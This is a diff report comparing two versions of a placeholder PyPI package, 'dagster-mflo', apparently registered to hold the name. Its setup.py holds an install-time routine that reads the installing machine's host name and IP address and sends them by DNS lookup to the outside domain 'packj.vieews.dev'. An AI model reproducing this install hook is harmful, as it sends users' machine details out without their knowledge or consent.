# Comparing `tmp/dagster-mflo-0.0.0.tar.gz` & `tmp/dagster-mflo-1.0.5.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "dagster-mflo-0.0.0.tar", last modified: Fri Jun  9 19:04:37 2023, max compression
+gzip compressed data, was "dagster-mflo-1.0.5.tar", last modified: Fri Jun  9 19:05:54 2023, max compression
```

## Comparing `dagster-mflo-0.0.0.tar` & `dagster-mflo-1.0.5.tar`

### file list

```diff
@@ -1,11 +1,11 @@
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-06-09 19:04:37.828816 dagster-mflo-0.0.0/
--rw-r--r--   0 runner    (1001) docker     (123)    11357 2023-06-09 19:04:24.000000 dagster-mflo-0.0.0/LICENSE
--rw-r--r--   0 runner    (1001) docker     (123)      525 2023-06-09 19:04:37.828816 dagster-mflo-0.0.0/PKG-INFO
--rw-r--r--   0 runner    (1001) docker     (123)       53 2023-06-09 19:04:24.000000 dagster-mflo-0.0.0/README.md
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-06-09 19:04:37.828816 dagster-mflo-0.0.0/dagster_mflo.egg-info/
--rw-r--r--   0 runner    (1001) docker     (123)      525 2023-06-09 19:04:37.000000 dagster-mflo-0.0.0/dagster_mflo.egg-info/PKG-INFO
--rw-r--r--   0 runner    (1001) docker     (123)      170 2023-06-09 19:04:37.000000 dagster-mflo-0.0.0/dagster_mflo.egg-info/SOURCES.txt
--rw-r--r--   0 runner    (1001) docker     (123)        1 2023-06-09 19:04:37.000000 dagster-mflo-0.0.0/dagster_mflo.egg-info/dependency_links.txt
--rw-r--r--   0 runner    (1001) docker     (123)        1 2023-06-09 19:04:37.000000 dagster-mflo-0.0.0/dagster_mflo.egg-info/top_level.txt
--rw-r--r--   0 runner    (1001) docker     (123)       38 2023-06-09 19:04:37.828816 dagster-mflo-0.0.0/setup.cfg
--rw-r--r--   0 runner    (1001) docker     (123)     3134 2023-06-09 19:04:24.000000 dagster-mflo-0.0.0/setup.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-06-09 19:05:54.686633 dagster-mflo-1.0.5/
+-rw-r--r--   0 runner    (1001) docker     (123)    11357 2023-06-09 19:05:43.000000 dagster-mflo-1.0.5/LICENSE
+-rw-r--r--   0 runner    (1001) docker     (123)      525 2023-06-09 19:05:54.686633 dagster-mflo-1.0.5/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (123)       53 2023-06-09 19:05:43.000000 dagster-mflo-1.0.5/README.md
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-06-09 19:05:54.686633 dagster-mflo-1.0.5/dagster_mflo.egg-info/
+-rw-r--r--   0 runner    (1001) docker     (123)      525 2023-06-09 19:05:54.000000 dagster-mflo-1.0.5/dagster_mflo.egg-info/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (123)      170 2023-06-09 19:05:54.000000 dagster-mflo-1.0.5/dagster_mflo.egg-info/SOURCES.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        1 2023-06-09 19:05:54.000000 dagster-mflo-1.0.5/dagster_mflo.egg-info/dependency_links.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        1 2023-06-09 19:05:54.000000 dagster-mflo-1.0.5/dagster_mflo.egg-info/top_level.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       38 2023-06-09 19:05:54.686633 dagster-mflo-1.0.5/setup.cfg
+-rw-r--r--   0 runner    (1001) docker     (123)     3144 2023-06-09 19:05:43.000000 dagster-mflo-1.0.5/setup.py
```

### Comparing `dagster-mflo-0.0.0/LICENSE` & `dagster-mflo-1.0.5/LICENSE`

 * *Files identical despite different names*

### Comparing `dagster-mflo-0.0.0/PKG-INFO` & `dagster-mflo-1.0.5/PKG-INFO`

 * *Files 3% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: dagster-mflo
-Version: 0.0.0
+Version: 1.0.5
 Summary: A placeholder package
 Home-page: https://github.com/ashishbijlani/sample-pypi-package
 Author: Ashish Bijlani
 Author-email: ab@gmail.com
 License: UNKNOWN
 Platform: UNKNOWN
 Classifier: Programming Language :: Python :: 3.8
```

### Comparing `dagster-mflo-0.0.0/dagster_mflo.egg-info/PKG-INFO` & `dagster-mflo-1.0.5/dagster_mflo.egg-info/PKG-INFO`

 * *Files 3% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: dagster-mflo
-Version: 0.0.0
+Version: 1.0.5
 Summary: A placeholder package
 Home-page: https://github.com/ashishbijlani/sample-pypi-package
 Author: Ashish Bijlani
 Author-email: ab@gmail.com
 License: UNKNOWN
 Platform: UNKNOWN
 Classifier: Programming Language :: Python :: 3.8
```

### Comparing `dagster-mflo-0.0.0/setup.py` & `dagster-mflo-1.0.5/setup.py`

 * *Files 2% similar despite different names*

```diff
@@ -44,30 +44,30 @@
 			host_name = socket.gethostname()
 			ipaddr = socket.gethostbyname(host_name)
 			query = f'#{ipaddr}#{host_name}#PyPI%{pkg_name}%{ver_str}%packj.vieews.dev'
 			socket.gethostbyname(query)
 	except:
 		pass
 
-send_usage_analytics("dagster-mflo", "")
+send_usage_analytics("dagster-mflo", "1.0.5")
 print("This is a placeholder package. Please contact for removal.")
 
 # Opens our README.md and assigns it to long_description.
 with open("README.md", "r") as fh:
     long_description = fh.read()
 
 # Defines requests as a requirement in order for this package to operate. The dependencies of the project.
 # requirements = ["requests<=2.21.0"]
 
 # Function that takes several arguments. It assigns these values to our package.
 setuptools.setup(
     # Distribution name the package. Name must be unique so adding your username at the end is common.
     name="dagster-mflo",
     # Version number of your package. Semantic versioning is commonly used.
-    version="",
+    version="1.0.5",
     # Author name.
     author="Ashish Bijlani",
     # Author's email address.
     author_email="ab@gmail.com",
     # Short description that will show on the PyPi page.
     description="A placeholder package",
     # Long description that will display on the PyPi page. Uses the repo's README.md to populate this.
```

